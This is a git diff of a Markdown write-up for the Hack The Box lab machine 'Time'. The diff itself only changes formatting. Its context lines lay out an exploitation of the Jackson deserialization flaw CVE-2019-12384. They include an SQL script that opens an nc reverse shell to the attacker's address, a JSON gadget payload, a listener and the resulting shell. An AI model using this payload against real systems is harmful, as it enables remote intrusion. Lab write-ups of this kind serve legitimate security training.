@@ -1,6 +1,6 @@
 ![](time_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
 
 # Scanning
@@ -18,15 +18,15 @@ PORT   STATE SERVICE VERSION
 
 ## Web_server
 
-__Title:__ __Online JSON parser :__ What is JSON PARSER ONLINE? JSON PARSER ONLINE lets you parse JSON string into a pretty and colorful JSON tree view. It parse JSON String and converts it into a human readable format string.
+**Title:** **Online JSON parser :** What is JSON PARSER ONLINE? JSON PARSER ONLINE lets you parse JSON string into a pretty and colorful JSON tree view. It parse JSON String and converts it into a human readable format string.
 
 * there are two options 
 
-  __Option1:__ __Beautify:__ convert JSON single string code into a JSON tree view.
+  **Option1:** **Beautify:** convert JSON single string code into a JSON tree view.
 
-  __Option2:__ __Validate (beta!):__ Validates a JSON string against RFC 4627 (The application/json media type for JavaScript Object Notation) and against the JavaScript language specification.
+  **Option2:** **Validate (beta!):** Validates a JSON string against RFC 4627 (The application/json media type for JavaScript Object Notation) and against the JavaScript language specification.
 
-  * __Error in Validate (beta!) option__
+  * **Error in Validate (beta!) option**
 
     when Validate with normal text string it through an error
 
@@ -38,26 +38,26 @@ __Title:__ __Online JSON parser :__ What is JSON PARSER ONLINE? JSON PARSER ONLI
 
 * But the Error tells that the server using JACKSON JSON parser,
   
-  __[Jackson](https://github.com/FasterXML/jackson) :__ Jackson is a high-performance JSON processor for Java. More than that, Jackson is a suite of data-processing tools for Java (and the JVM platform), Jackson has been known as "the Java JSON library" or "the best JSON parser for Java".
+  **[Jackson](https://github.com/FasterXML/jackson) :** Jackson is a high-performance JSON processor for Java. More than that, Jackson is a suite of data-processing tools for Java (and the JVM platform), Jackson has been known as "the Java JSON library" or "the best JSON parser for Java".
   
   *this server using Jackson library for deserializing JSONs*
   
-__vulnerability :__ deserialization vulnerability CVE-2019-12384
+**vulnerability :** deserialization vulnerability CVE-2019-12384
 
-__Jackson gadgets - Anatomy of a vulnerability__ doyensec.com [Report](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
+**Jackson gadgets - Anatomy of a vulnerability** doyensec.com [Report](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
 
 *an attacker may leverage this deserialization vulnerability to trigger attacks such as Server-Side Request Forgery (SSRF) and remote code execution.*
 
-* __attack__
+* **attack**
 
   this attack produce in 2 steps
   
-  * __First__, serve the inject.sql INIT file through a simple http server,
-  * __Second__, call the script from the server.
+  * **First**, serve the inject.sql INIT file through a simple http server,
+  * **Second**, call the script from the server.
   
 # User Exploit
 
-__First__, create __inject.sql__  
+**First**, create **inject.sql**  
 ```sql
 CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
         String[] command = {"bash", "-c", cmd};
@@ -67,11 +67,11 @@ $$;
 CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tun0> 4141 >/tmp/f')
 ```
 
-__Second__, serve the inject.sql INIT file through a simple http server
+**Second**, serve the inject.sql INIT file through a simple http server
 
     sudo python -m SimpleHTTPServer 80
 	  
-__Third__, code that pass into the validate option
+**Third**, code that pass into the validate option
 ```json
 [
    "ch.qos.logback.core.db.DriverManagerConnectionSource",
@@ -80,11 +80,11 @@ __Third__, code that pass into the validate option
    }
 ]
 ```
-__Fourth__, open nc
+**Fourth**, open nc
 
     nc -nvlp 4141
 
-__shell__,
+**shell**,
 
 ```bash
 listening on [any] 4141 ...
@@ -94,7 +94,7 @@ $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 pericles@time:/var/www/html$
 ```
 
-* __user flag__
+* **user flag**
 
 	  pericles@time:/var/www/html$ cat ~/user.txt
 	  cat ~/user.txt
@@ -108,7 +108,7 @@ running lipeas found a script owned by user pericles
 You own the script: /usr/bin/timer_backup.sh
 ```
 
-__timer_backup.sh__
+**timer_backup.sh**
 
 	pericles@time:/home/pericles$ ls -lsh /usr/bin/timer_backup.sh
 	ls -lsh /usr/bin/timer_backup.sh
